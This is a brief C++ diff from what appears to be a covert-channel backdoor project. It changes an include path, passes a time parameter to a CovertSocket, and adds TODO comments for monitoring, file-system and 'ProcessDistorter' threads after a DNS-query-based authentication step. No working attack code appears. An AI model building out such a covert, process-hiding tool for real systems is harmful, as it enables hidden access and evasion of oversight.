@@ -10,7 +10,7 @@
 #include "../shared/PacketIdentifier.h"
 #include "../shared/Structures.h"
 #include "../shared/Authenticator.h"
-#include "CovertSocket.h"
+#include "covertsocket/CovertSocket.h"
 
 string parseOutDNSQuery(PacketMeta meta){
 
@@ -121,8 +121,20 @@ int main(int argc, char * argv[]) {
     Authenticator::setPassword(dnsQuery);
     crypto->initialize(dnsQuery);
 
-    CovertSocket * covertSocket = new CovertSocket(analyzer, crypto, clientIP);
+    CovertSocket * covertSocket = new CovertSocket(analyzer, crypto, time, clientIP);
     covertSocket->send(dnsQuery);
+
+    //WE ARE NOW IN FULL FUNCTIONALITY MODE
+
+
+    //create pthread for NetworkMonitor
+    //create pthread for CovertSocket
+    //create pthread for FileSystemManager ?
+    //create pthread for ProcessDistorter
+
+
+
+
 
     // - Pass TrafficAnalyzer
 
